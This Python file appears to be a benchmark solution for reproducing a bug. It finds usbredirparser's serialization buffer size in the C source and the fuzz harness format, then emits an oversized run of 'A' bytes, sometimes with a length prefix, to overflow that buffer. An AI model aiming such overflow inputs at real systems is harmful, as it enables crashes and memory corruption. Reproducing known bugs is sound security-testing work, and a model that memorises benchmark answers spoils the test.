import os
import re
import ast
import tarfile
import tempfile
import struct
from typing import Optional, Tuple, List


class Solution:
    def solve(self, src_path: str) -> bytes:
        root = self._prepare_root(src_path)
        try:
            buf_size = self._find_serialize_buf_size(root) or 65536
            harness_text = self._find_harness_text(root)
            needs_len_prefix = self._detect_needs_len_prefix(harness_text)
        except Exception:
            buf_size = 65536
            needs_len_prefix = False

        margin = 4096
        payload_len = buf_size + margin
        payload = b"A" * payload_len

        if needs_len_prefix:
            return struct.pack("<I", payload_len) + payload
        return payload

    def _prepare_root(self, src_path: str) -> str:
        if os.path.isdir(src_path):
            return src_path

        td = tempfile.mkdtemp(prefix="src_")
        try:
            with tarfile.open(src_path, "r:*") as tf:
                tf.extractall(td)
        except Exception:
            return td

        entries = [e for e in os.listdir(td) if not e.startswith(".")]
        if len(entries) == 1:
            p = os.path.join(td, entries[0])
            if os.path.isdir(p):
                return p
        return td

    def _iter_source_files(self, root: str, exts: Tuple[str, ...]) -> List[str]:
        out = []
        for dp, _, fns in os.walk(root):
            for fn in fns:
                lfn = fn.lower()
                if any(lfn.endswith(ext) for ext in exts):
                    out.append(os.path.join(dp, fn))
        return out

    def _read_text(self, path: str, max_bytes: int = 256_000) -> str:
        try:
            with open(path, "rb") as f:
                data = f.read(max_bytes)
            return data.decode("utf-8", "ignore")
        except Exception:
            return ""

    def _find_serialize_buf_size(self, root: str) -> Optional[int]:
        define_re = re.compile(r'^\s*#\s*define\s+USBREDIRPARSER_SERIALIZE_BUF_SIZE\s+(.+?)\s*(?:/[*].*?[*]/\s*)?(?://.*)?$')
        candidates = self._iter_source_files(root, (".h", ".c", ".cc", ".cpp", ".cxx"))
        for path in candidates:
            txt = self._read_text(path, max_bytes=512_000)
            if "USBREDIRPARSER_SERIALIZE_BUF_SIZE" not in txt:
                continue
            for line in txt.splitlines():
                m = define_re.match(line)
                if not m:
                    continue
                expr = m.group(1).strip()
                val = self._eval_c_int_expr(expr)
                if isinstance(val, int) and 1024 <= val <= 1024 * 1024 * 16:
                    return val
        return None

    def _strip_c_suffixes(self, s: str) -> str:
        s = re.sub(r'(?<=\b0x[0-9a-fA-F]+)[uUlL]+\b', '', s)
        s = re.sub(r'(?<=\b\d+)[uUlL]+\b', '', s)
        return s

    def _eval_c_int_expr(self, expr: str) -> Optional[int]:
        expr = expr.strip()
        expr = expr.split("//", 1)[0].strip()
        expr = re.sub(r'/\*.*?\*/', '', expr).strip()
        expr = self._strip_c_suffixes(expr)
        if not expr:
            return None
        if re.search(r'[A-Za-z_]', expr):
            return None
        try:
            node = ast.parse(expr, mode="eval")
        except Exception:
            return None

        def ev(n):
            if isinstance(n, ast.Expression):
                return ev(n.body)
            if isinstance(n, ast.Constant) and isinstance(n.value, (int,)):
                return int(n.value)
            if isinstance(n, ast.UnaryOp) and isinstance(n.op, (ast.UAdd, ast.USub, ast.Invert)):
                v = ev(n.operand)
                if isinstance(n.op, ast.UAdd):
                    return +v
                if isinstance(n.op, ast.USub):
                    return -v
                return ~v
            if isinstance(n, ast.BinOp) and isinstance(
                n.op,
                (ast.Add, ast.Sub, ast.Mult, ast.Div, ast.FloorDiv, ast.Mod, ast.LShift, ast.RShift, ast.BitOr, ast.BitAnd, ast.BitXor),
            ):
                a = ev(n.left)
                b = ev(n.right)
                if isinstance(n.op, ast.Add):
                    return a + b
                if isinstance(n.op, ast.Sub):
                    return a - b
                if isinstance(n.op, ast.Mult):
                    return a * b
                if isinstance(n.op, (ast.Div, ast.FloorDiv)):
                    if b == 0:
                        raise ZeroDivisionError
                    return a // b
                if isinstance(n.op, ast.Mod):
                    if b == 0:
                        raise ZeroDivisionError
                    return a % b
                if isinstance(n.op, ast.LShift):
                    return a << b
                if isinstance(n.op, ast.RShift):
                    return a >> b
                if isinstance(n.op, ast.BitOr):
                    return a | b
                if isinstance(n.op, ast.BitAnd):
                    return a & b
                if isinstance(n.op, ast.BitXor):
                    return a ^ b
            raise ValueError("unsupported")

        try:
            v = ev(node)
            if isinstance(v, int):
                return v
        except Exception:
            return None
        return None

    def _find_harness_text(self, root: str) -> str:
        candidates = []
        for path in self._iter_source_files(root, (".c", ".cc", ".cpp", ".cxx")):
            txt = self._read_text(path, max_bytes=256_000)
            if not txt:
                continue
            s = 0
            if "LLVMFuzzerTestOneInput" in txt:
                s += 1000
            if "usbredirparser" in txt:
                s += 100
            if "serialize_data" in txt or "usbredirparser_serialize" in txt or "serialize(" in txt:
                s += 200
            if re.search(r'\bmain\s*\(', txt):
                s += 50
            base = os.path.basename(path).lower()
            if "fuzz" in base:
                s += 120
            if "test" in base:
                s += 20
            if s > 0:
                candidates.append((s, path, txt))
        if not candidates:
            return ""
        candidates.sort(key=lambda x: x[0], reverse=True)
        return candidates[0][2]

    def _detect_needs_len_prefix(self, harness_text: str) -> bool:
        if not harness_text:
            return False

        ht = harness_text

        if "FuzzedDataProvider" in ht or "ConsumeRemainingBytes" in ht or "ConsumeBytes" in ht:
            return False

        patterns = [
            r'\bSize\s*<\s*4\b',
            r'\bsize\s*<\s*4\b',
            r'\bmemcpy\s*\(\s*&\s*\w+\s*,\s*Data\s*,\s*4\s*\)',
            r'\*\s*\(\s*(?:const\s+)?uint32_t\s*\*\s*\)\s*Data',
            r'read(?:_)?le32\s*\(\s*Data\s*\)',
            r'get_u32\s*\(\s*&\s*Data\s*,\s*&\s*Size\s*\)',
        ]
        hits = 0
        for p in patterns:
            if re.search(p, ht, flags=re.IGNORECASE | re.MULTILINE):
                hits += 1
        return hits >= 2